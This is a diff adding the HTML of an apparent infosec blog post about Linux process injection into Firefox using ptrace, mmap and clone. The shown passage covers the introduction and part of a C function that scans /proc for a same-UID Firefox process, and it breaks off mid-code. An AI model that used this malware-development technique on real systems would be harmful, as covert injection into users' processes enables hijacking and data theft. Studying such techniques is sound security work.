@@ -1,0 +1,1200 @@
+
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
+  data-auto-appearance="true"><head>
+  <meta charset="utf-8" />
+  
+  <meta http-equiv="content-language" content="en" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+  
+  <title>Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread) &middot; </title>
+  <meta name="title" content="Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread) &middot; " />
+  
+  <meta name="description" content="An awesome infosec blog :)" />
+  <meta name="keywords" content="Linux Malware, Process Injection, " />
+  
+  
+  <link rel="canonical" href="https://mutur4.github.io/posts/remote-process-injection/" />
+  
+  <link rel="alternate" type="application/rss+xml" href="/posts/remote-process-injection/index.xml" title="" />
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.fcb6b8f47fcf9d08dccf3e85cedee48f9dd6c0a0178e95c67a74e69f9f0588e77e10dd8d49c8f6d925fe24eb977a3c36f555f882737ae3f73d21fc10c8402b52.css"
+    integrity="sha512-/La49H/PnQjczz6Fzt7kj53WwKAXjpXGenTmn58FiOd&#43;EN2NScj22SX&#43;JOuXejw29VX4gnN64/c9IfwQyEArUg==" />
+  
+  
+  <script type="text/javascript" src="/js/appearance.min.d9c603046c077ebf0e88cb0cc75a77d795076c4f973750e71410c9e530eed5bd3b48204bb18b980da897cb9feb8371ec5cecb0056a738ddf4ab9ed2ac4b331bb.js"
+    integrity="sha512-2cYDBGwHfr8OiMsMx1p315UHbE&#43;XN1DnFBDJ5TDu1b07SCBLsYuYDaiXy5/rg3HsXOywBWpzjd9Kue0qxLMxuw=="></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.2021de190770621f45a1934d8a7bf9bae8420e3be8bd3e8b0409eeca15e2d25efd112c4c7276b4ab500db338c7afd272beea301310ad15bd98cbf94a9f3dead2.js"
+    integrity="sha512-ICHeGQdwYh9FoZNNinv5uuhCDjvovT6LBAnuyhXi0l79ESxMcna0q1ANszjHr9JyvuowExCtFb2Yy/lKnz3q0g==" data-copy="" data-copied=""></script>
+  
+  <script src="/js/zoom.min.js"></script>
+  
+  
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+  <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:title" content="Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread)" />
+<meta property="og:description" content="An awesome infosec blog :)" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://mutur4.github.io/posts/remote-process-injection/" /><meta property="og:image" content="https://mutur4.github.io/posts/remote-process-injection/featured.png"/>
+
+
+  <meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://mutur4.github.io/posts/remote-process-injection/featured.png"/>
+<meta name="twitter:title" content="Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread)"/>
+<meta name="twitter:description" content="An awesome infosec blog :)"/>
+
+  
+  
+
+  
+  
+  <meta name="author" content="BinaryChunk" />
+  
+  
+  
+  <link href="https://github.com/mutur4" rel="me" />
+  
+  
+  <link href="https://twitter.com/binarychunk" rel="me" />
+  
+  
+  <link href="mailto:8421gilbertrobert@gmail.com" rel="me" />
+  
+  
+  <link href="https://linkedin.com/in/gilbert-robert-m" rel="me" />
+  
+  
+  <link href="https://mastodon.social/@binarychunk" rel="me" />
+  
+  
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.js" integrity=""></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+
+  
+  
+  <meta name="theme-color"/>
+  
+  
+</head>
+<body
+  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32">
+  <div id="the-top" class="absolute flex self-center">
+    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+      href="#main-content"><span
+        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
+  </div>
+  
+  
+  <div class="min-h-[148px]"></div>
+<div class="fixed inset-x-0 pl-[24px] pr-[24px]" style="z-index:100">
+  <div id="menu-blur" class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800"></div>
+  <div class="relative max-w-[64rem] ml-auto mr-auto">
+    <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
+    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
+    
+    
+    
+    <div>
+        <a href="/" class="flex">
+            <span class="sr-only"></span>
+
+            <img src="/img/ffz.png" width="50" height="50"
+                class="max-h-[5rem] max-w-[5rem] object-scale-down object-left nozoom" alt="" />
+
+        </a>
+    </div>
+    
+    <div class="flex flex-1 items-center justify-between">
+        <nav class="flex space-x-3">
+
+            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900"></a>
+
+
+        </nav>
+        <nav class="hidden md:flex items-center space-x-5 md:ml-12">
+
+            
+            
+            
+  <a href="/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="">
+        Home
+    </p>
+</a>
+
+
+            
+            
+  <a href="/about/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="About Me">
+        About
+    </p>
+</a>
+
+
+            
+            
+  <a href="/ctfs/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="CTFs">
+        CTFs
+    </p>
+</a>
+
+
+            
+            
+  <a href="/posts/"  class="flex items-center">
+    
+    <p class="text-base font-medium text-gray-500 hover:text-gray-900" title="Blog Posts">
+        Posts
+    </p>
+</a>
+
+
+            
+            
+
+            
+
+
+            
+            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+
+            
+            
+            <div
+                class="ltr:mr-14 rtl:ml-14 cursor-pointer text-sm text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400">
+                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button">
+                    <div class="flex items-center justify-center h-12 dark:hidden">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                    </div>
+                    <div class="items-center justify-center hidden h-12 dark:flex">
+                        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                    </div>
+                </button>
+            </div>
+            
+
+        </nav>
+        <div class="flex md:hidden items-center space-x-5 md:ml-12">
+
+            <span></span>
+
+            
+
+
+            
+            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+                title="">
+                
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+            </button>
+            
+
+            
+            
+            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" style="margin-right:5px">
+                <div class="flex items-center justify-center h-12 dark:hidden">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+                </div>
+                <div class="items-center justify-center hidden h-12 dark:flex">
+                    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+                </div>
+            </button>
+            
+
+        </div>
+    </div>
+    <div class="-my-2 -mr-2 md:hidden">
+
+        <label id="menu-button" for="menu-controller" class="block">
+            <input type="checkbox" id="menu-controller" class="hidden" />
+            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+            </div>
+            <div id="menu-wrapper" style="padding-top:5px;"
+                class="fixed inset-0 z-30 invisible w-screen h-screen m-auto overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
+                <ul
+                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+
+                    <li>
+                        <span
+                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+</span>
+                    </li>
+
+                    
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="">
+            Home
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/about/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="About Me">
+            About
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/ctfs/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="CTFs">
+            CTFs
+        </p>
+    </a>
+</li>
+
+
+
+                    
+
+                    
+  <li class="mt-1">
+    <a href="/posts/"  class="flex items-center">
+        
+        <p class="text-bg font-bg text-gray-500 hover:text-gray-900" title="Blog Posts">
+            Posts
+        </p>
+    </a>
+</li>
+
+
+
+                    
+                    
+
+                </ul>
+                
+
+            </div>
+        </label>
+    </div>
+</div>
+
+
+
+
+
+  </div>
+</div>
+<script>
+  window.addEventListener('scroll', function (e) {
+    var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+    var background_blur = document.getElementById('menu-blur');
+    background_blur.style.opacity = (scroll / 300);
+  });
+</script>
+
+  
+  <div class="relative flex flex-col grow">
+    <main id="main-content" class="grow">
+      
+
+
+
+
+
+
+
+
+<div id="hero" class="h-[150px] md:h-[200px]"></div>
+
+
+    
+    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
+    style="background-image:url(/posts/remote-process-injection/featured_hu93c16ecf687e3e7ba30f447cf66194ff_311211_1200x0_resize_box_3.png);">
+    
+
+
+    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
+    </div>
+    <div
+        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
+    </div>
+</div>
+
+<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
+<script>
+    window.addEventListener('scroll', function (e) {
+        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+        var background_blur = document.getElementById('background-blur');
+        background_blur.style.opacity = (scroll / 300)
+    });
+</script>
+
+ <header>
+  
+  <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
+  
+  
+    
+  
+    
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/"
+      ></a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline ">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/"
+      >Blog Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="inline hidden">
+    <a
+      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
+      href="/posts/remote-process-injection/"
+      >Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread)</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+  
+  <h1 class="mt-5 text-4xl font-extrabold text-neutral-900 dark:text-neutral">Linux Process Injection - (Emulating VirtualAllocEX and CreateRemoteThread)</h1>
+  <div class="mt-1 mb-2 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="flex flex-row flex-wrap items-center">
+  
+  
+</div>
+
+
+  </div>
+  </header>
+  <section class="mt-12 prose flex max-w-full flex-col dark:prose-invert lg:flex-row">
+    
+    <div class="order-first px-0 lg:order-last lg:max-w-xs ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 lg:sticky lg:top-10">
+        <details open class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#process-enumeration">Process Enumeration</a></li>
+        <li><a href="#memory-enumeration">Memory Enumeration</a></li>
+        <li><a href="#remote-mmap">Remote <code>mmap</code></a></li>
+        <li><a href="#remote-code-execution">Remote Code Execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#process-enumeration">Process Enumeration</a></li>
+        <li><a href="#memory-enumeration">Memory Enumeration</a></li>
+        <li><a href="#remote-mmap">Remote <code>mmap</code></a></li>
+        <li><a href="#remote-code-execution">Remote Code Execution</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+ 
+<script>
+  (function () {
+    var $toc = $('#TableOfContents');
+    if ($toc.length > 0) {
+      var $window = $(window);
+
+      function onScroll() {
+        var currentScroll = $window.scrollTop();
+        var h = $('.anchor');
+        var id = "";
+        h.each(function (i, e) {
+          e = $(e);
+          if (e.offset().top - $(window).height()/3 <= currentScroll) {
+            id = e.attr('id');
+          }
+        });
+        var active = $toc.find('a.active');      
+        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
+
+        active.each(function (i, e) {
+           
+            $(e).removeClass('active').siblings('ul').hide();
+          
+        });
+        $toc.find('a[href="#' + id + '"]').addClass('active')
+        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
+          $(e).children('a').parents('ul').show();          
+        });
+      }
+
+      $window.on('scroll', onScroll);
+      $(document).ready(function () {
+         
+          $toc.find('a').parent('li').find('ul').hide();
+        
+        onScroll();
+      });
+    }
+  })();
+</script>
+
+      </div>
+    </div>
+    
+    <div class="min-w-0 min-h-0 max-w-prose">
+      <div id="introduction" class="anchor"></div>
+<h2 class="relative group">Introduction 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#introduction" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>When it comes to Linux/Unix we aren&rsquo;t provided with a bunch of sweet documented APIs as with <strong>Windows</strong> but instead are handed over a couple of system calls.</p>
+<p>For a simple <strong>Windows Process Injection</strong> technique, a process is somewhat able to map a new memory map on behalf of another remote process via <code>VirtualAllocEx</code> and has the ability to read and write into this memory region and at the same time having the ability to create a thread that will run in the context of that remote process via <code>CreateRemoteThread</code>.</p>
+<p><strong>Linux Process Injection</strong> is completely different in that we aren&rsquo;t provided with such interesting APIs <em>(I bet this is mentioned alot in other blog posts)</em>. In this post we will emulate the behaviour of the above mentioned Windows Process Injection technique by combining <code>ptrace</code>, <code>mmap</code> and the <code>clone</code> system calls to inject into firefox.</p>
+<p>The <strong>usage</strong> and <strong>knowledge</strong> of the <code>ptrace</code> system call for simple code injection is needed but not required. A more and somewhat detailed description is provided <a href="https://mutur4.github.io/posts/linux-malware-development/process-injection"   target="_blank">
+    here</a></p>
+<div id="process-enumeration" class="anchor"></div>
+<h3 class="relative group">Process Enumeration 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#process-enumeration" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p><strong>Process Enumeration</strong> is key in injection since we want to find a suitable process where we can inject our code. This is helpful in finding a process owned by us <em>(same uid)</em> and also having a fail-safe when an injection into another process fails.</p>
+<p>Linux Processes can be enumerated by parsing the <code>/proc</code> directory and looking for &rsquo;numbered&rsquo; directories. For example, a process with  pid of <code>1337</code> will have its information stored at <code>/proc/1337/</code>.</p>
+<p>The <code>UID</code> of a process will also be stored at  <code>/proc/&lt;PID&gt;/status</code> file as shown for an example process below.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/qlZIWWl.png" alt="Process UID" />
+    
+  </figure>
+
+</p>
+<p>The following <code>C</code> code snippet will simply enumerate all processes to check for a valid firefox process that shares the same <code>UID</code> as the injecting process <code>getuid()</code> and returns information about this process in a struct variable for injection.</p>
+
+  
+  
+  
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="ltr:pr-3 rtl:pl-3 flex items-center"
+      style="color: #FF0000"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
+<path fill="currentColor"  d="M159.3 5.4c7.8-7.3 19.9-7.2 27.7 .1c27.6 25.9 53.5 53.8 77.7 84c11-14.4 23.5-30.1 37-42.9c7.9-7.4 20.1-7.4 28 .1c34.6 33 63.9 76.6 84.5 118c20.3 40.8 33.8 82.5 33.8 111.9C448 404.2 348.2 512 224 512C98.4 512 0 404.1 0 276.5c0-38.4 17.8-85.3 45.4-131.7C73.3 97.7 112.7 48.6 159.3 5.4zM225.7 416c25.3 0 47.7-7 68.8-21c42.1-29.4 53.4-88.2 28.1-134.4c-2.8-5.6-5.6-11.2-9.8-16.8l-50.6 58.8s-81.4-103.6-87.1-110.6C133.1 243.8 112 273.2 112 306.8C112 375.4 162.6 416 225.7 416z"/></svg>
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >The code snippet is compatible in that it can return any specific process for injection in this case <code>firefox</code> or injection can be limited to any process that is run in our <code>uid</code> context.</span>
+</div>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">PPROCESS</span> <span class="nf">enumProcs</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PPROCESS</span> <span class="n">head</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">DIR</span> <span class="o">*</span><span class="n">dir</span> <span class="o">=</span> <span class="n">opendir</span><span class="p">(</span><span class="s">&#34;/proc&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">dir</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">e</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//This is used to return all the live processes (PIDz)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">while</span><span class="p">((</span><span class="n">e</span><span class="o">=</span><span class="n">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">atoi</span><span class="p">(</span><span class="n">e</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">)</span> <span class="o">||</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">d_type</span> <span class="o">!=</span> <span class="n">DT_DIR</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">//Determine the owner of the process and compare this to ours
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">                <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="n">CMDLINESZ</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                <span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="s">&#34;/proc/%s/status&#34;</span><span class="p">,</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="c1">//read this file to find the process id 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">                <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">CMDLINESZ</span> <span class="o">*</span> <span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span> <span class="k">continue</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="kt">int</span> <span class="n">readsz</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span><span class="p">(</span><span class="n">readsz</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="kt">char</span> <span class="o">*</span><span class="n">needle</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">DELIM</span><span class="p">);</span>
